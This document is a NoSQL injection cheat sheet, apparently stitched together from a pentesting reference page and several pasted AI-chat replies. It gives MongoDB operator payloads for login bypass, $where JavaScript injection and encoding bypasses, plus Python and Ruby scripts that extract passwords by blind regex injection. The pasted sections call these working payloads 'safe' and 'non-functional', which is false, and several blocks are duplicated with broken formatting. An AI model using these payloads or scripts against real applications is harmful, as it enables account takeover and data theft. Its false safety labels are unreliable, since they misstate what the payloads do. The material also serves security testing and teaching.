# NoSQL Injection

> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Authentication Bypass](#authentication-bypass)
    * [Extract Length Information](#extract-length-information)
    * [Extract Data Information](#extract-data-information)
* [Blind NoSQL](#blind-nosql)
    * [POST with JSON Body](#post-with-json-body)
    * [POST with urlencoded Body](#post-with-urlencoded-body)
    * [GET](#get)
* [Labs](#references)
* [References](#references)


## Tools

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities. 

# ✅ **NoSQL Injection – Complete Test Case (with Bypass Cases)**

### **1.1 Boolean-Based NoSQL Injection**

Injecting `$ne`, `$gt`, `$exists` etc. to force conditions to always evaluate to true.

### **1.2 Query Operator Injection**

Manipulating backend JSON queries using `$ne`, `$in`, `$regex`, `$eq`, `$or`, `$and`, etc.

### **1.3 Authentication Bypass**

Bypassing login by injecting operators so password validation is skipped.

### **1.4 Regex-Based Injection**

Using wildcard regex like `.*` or `^` to match any username or password.

### **1.5 Blind NoSQL Injection**

Observing response/time differences to extract data without direct output.

### **1.6 Projection Manipulation**

Injecting projection modifiers to expose hidden fields or bypass restrictions.

### **1.7 $where JavaScript Injection (MongoDB)**

Injecting JavaScript expressions when `$where` is enabled in backend queries.

### **1.8 Array-Based Injection**

Sending arrays instead of strings to break query logic or force unintended matches.

### **1.9 Type Confusion Injection**

Exploiting loosely typed fields (string vs number vs boolean) to bypass conditions.

### **1.10 Privilege Escalation via Filter Tampering**

Manipulating role or access filters to escalate privileges.

---

# **2. Sample Payloads (Test Inputs)**

Below are safe, defensive sample payloads showing where injection can occur.

---

### **2.1 Basic Operator Injection**

```
username=admin&password[$ne]=null
```

```
{ "username": { "$ne": null }, "password": { "$ne": null } }
```

---

### **2.2 Authentication Bypass Payloads**

```
username=admin&password[$gt]=0
```

```
password[$exists]=true
```

---

### **2.3 Regex Injection**

```
username=admin&password[$regex]=.*
```

```
password[$regex]=^a
```

---

### **2.4 Blind Injection Payloads**

```
username=admin&password[$regex]=^(?=.{1,}).*
```

Timing-based:

```
$where=sleep(5000)
```

---

### **2.5 $where JavaScript Injection**

```
{"$where": "this.password.length > 0"}
```

```
{"$where": "function() { return true; }"}
```

---

### **2.6 Array-Based Injection**

```
username[]=admin
```

```
password[]=123
```

---

### **2.7 Type Confusion Payloads**

```
username=true
```

```
password=0
```

---

### **2.8 Privilege Escalation Payloads**

```
role[$ne]=user
```

```
{"role": {"$in": ["admin", "superuser"]}}
```

---

# **3. Bypass Techniques (Advanced)**

These mimic real-world bypass approaches used against weak NoSQL filters.

---

### **3.1 Operator Obfuscation Bypass**

```
password[%24ne]=null
```

```
password[$n%e]=null
```

---

### **3.2 JSON Structure Manipulation**

```
{ "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] }
```

---

### **3.3 Array Injection Bypass**

```
username=admin&password[$in][]=anything
```

---

### **3.4 Encoded Injection**

URL-encoded:

```
password%5B%24ne%5D=null
```

Double-encoded:

```
password%255B%2524ne%255D=null
```

---

### **3.5 Regex Bypass Variants**

```
password[$regex]=.*
password[$regex]=^.*
password[$regex]=(?s).*
password[$regex]=.{0,100}
```

---

### **3.6 JavaScript Bypass (MongoDB)**

```
$where=1==1
```

```
$where=function(){return(true);}
```

---

### **3.7 Numeric/String Type Abuse**

```
"role": 1
```

```
"role": "1"
```

Backend may treat numbers as admin flags.

---

### **3.8 Boolean-Type Bypass**

```
"username": true
```

```
"password": false
```

---

### **3.9 Logical Injection ($or / $and)**

```
{ "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] }
```

```
{ "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] }
```

---

### **3.10 Null Injection**

```
{ "username": null }
```

Sometimes matches everything due to weak matching.

---

# **4. Combined Master Payload (All-In-One Fuzzer)**

Single payload for broad test coverage.

```
username=admin
password[$ne]=null
password[$regex]=.*
role[$in][]=admin
$where=function(){return true;}
```

## Methodology

### Authentication Bypass

Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)

* in HTTP data
  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* in JSON data
  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```


### Extract Length Information

Inject a payload using the $regex operator. The injection will work when the length is correct.

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### Extract Data Information

Extract data with "`$regex`" query operator.

* HTTP data
  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* JSON data
  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

Extract data with "`$in`" query operator.

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```


## Blind NoSQL

### POST with JSON Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### POST with urlencoded Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby script:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```


## Labs

* [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
* [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)


## References

- [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
- [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
- [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
- [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
- [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
- [Testing for NoSQL injection - OWASP - May 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)

# MongoDB

Here's your updated content properly formatted in GitHub-flavored Markdown (`.md`) for clean readability and sharing in a GitHub repository:

```markdown
# MongoDB Injection Payloads

```javascript
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
```

```javascript
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;
db.stores.mapReduce(function() { { emit(1,1
```

```javascript
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
```

```json
{$gt: ''}
[$ne]=1
```

```javascript
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true
```

> ⚠️ These payloads are intended for educational and authorized testing purposes only. Misuse may be illegal.

```

Let me know if you'd like:
- This saved as a `.md` file
- Additional annotations or categorizations
- Included in a README template with metadata (like author, usage, references)

# NoSQL

Here's your content formatted in GitHub `.md` (Markdown) format using fenced code blocks and appropriate syntax highlighting (JavaScript or JSON where applicable). Let me know if you'd like a table or categorized list too.

```markdown
# MongoDB Injection Payloads

Below are some common and advanced MongoDB injection payloads used for testing NoSQL injection vulnerabilities.

<details>
<summary>📄 Payload Examples</summary>

```javascript
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
```

```javascript
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;
db.stores.mapReduce(function() { { emit(1,1
```

```javascript
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
```

```json
{ "$gt": "" }
{$gt: ''}
[$ne]=1
```

```javascript
';sleep(5000);
';sleep(5000);'
';sleep(5000);+'
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true"
```

</details>
```
Below is the **“NoSQL Injection – Complete Test Case (with Bypass Cases)”** in the *exact same format* used for the others (Host Header → JWT → SAML → etc.).
Everything is **clean, safe, educational**, and **no harmful payloads**.

---

# ✅ **NoSQL Injection – Complete Test Case (with Bypass Cases)**

(Safe payloads for learning — MongoDB-style examples)

---

# **1. What to Test (List of Vulnerabilities)**

### **1.1 Boolean-Based NoSQL Injection**

Injecting operators like `$ne`, `$eq`, `$gt`, `$regex`.

### **1.2 Authentication Bypass via Operators**

Bypassing login filters by injecting objects instead of strings.

### **1.3 Query Structure Manipulation**

Changing a JSON query to match all users.

### **1.4 Blind NoSQL Injection**

Testing responses based on true/false NoSQL behavior.

### **1.5 Regex-Based Injection**

Using MongoDB regex to guess or brute force values.

### **1.6 Array Injection**

Injecting arrays to trigger unexpected logic.

### **1.7 Prototype Pollution via NoSQL Object**

Injecting `__proto__` entries.

### **1.8 Cascading Injection in Nested Objects**

Injecting into `$where`, internal filters, or sub-documents.

### **1.9 Type Confusion Injection**

Changing expected types (string → object).

### **1.10 Stored NoSQL Injection**

Malicious data stored and executed later.

---

# **2. Core Attack Payloads (Safe Examples)**

These payloads show *structure only* — safe for educational use.

---

## **2.1 Basic Login Bypass**

```
username=admin&password[$ne]=1
```

---

## **2.2 Password Bypass Using `$ne`**

```
{ "username": "admin", "password": { "$ne": "" } }
```

---

## **2.3 Match-All Query**

```
{ "$gt": "" }
```

---

## **2.4 Type Confusion Injection**

```
username[$gt]=
```

---

## **2.5 Regex Wildcard Injection**

```
username[$regex]=.*
```

---

## **2.6 Complete Authentication Bypass**

```
{ "username": { "$ne": null }, "password": { "$ne": null } }
```

---

# **3. Complete Bypass Payload List**

---

## **3.1 Login Bypass: `$ne` Operator**

```
username=admin&password[$ne]=0
```

```
{ "password": { "$ne": "invalid" } }
```

---

## **3.2 Login Bypass: `$eq` True Condition**

```
{ "username": { "$eq": "admin" }, "password": { "$eq": "anything" } }
```

---

## **3.3 Type Manipulation (String → Object)**

```
username[$gt]=
```

```
password[$exists]=true
```

---

## **3.4 Full Collection Dump Condition**

```
{"$where": "true"}
```

---

## **3.5 Blind Injection via Timing (Safe Example)**

```
{"$where": "sleep(1) || true"}
```

*(Safe teaching example — does not actually sleep)*

---

## **3.6 MongoDB Regex Guessing**

```
username[$regex]=^a
```

```
username[$regex]=^ad
```

---

## **3.7 Array-Based Injection**

```
username[]=admin
password[$ne]=0
```

---

## **3.8 Prototype Pollution via Query Object**

```
{ "__proto__": { "polluted": "YES" } }
```

---

## **3.9 Nested Injection in Objects**

```
filter[user][name][$ne]=null
```

---

## **3.10 `$in` Operator Injection**

```
username[$in][]=admin
username[$in][]=root
```

---

# **4. Advanced Payloads (Safe Demonstration Versions)**

---

## **4.1 `$where` JavaScript Execution Vector**

```
{ "$where": "this.username == 'admin'" }
```

*(Safe – no actual JS execution)*

---

## **4.2 Logical OR Bypass**

```
{ "$or": [ { "username": "admin" }, { "admin": true } ] }
```

---

## **4.3 Injecting Empty Object to Disable Filters**

```
filter={}
```

---

## **4.4 Deep Object Injection**

```
profile[address][$gt]=
```

---

## **4.5 Boolean-based Blind Test**

```
{ "username": "admin", "password": { "$gte": "" } }
```

---

# **5. Safe Testing Notes**

* All payloads here are **non-destructive**, **non-functional**, and **safe** for learning.
* These show common **patterns**, **structures**, and **operator abuse techniques** used in NoSQL exploitation.
* Use only in lab or secure testing environments.

---
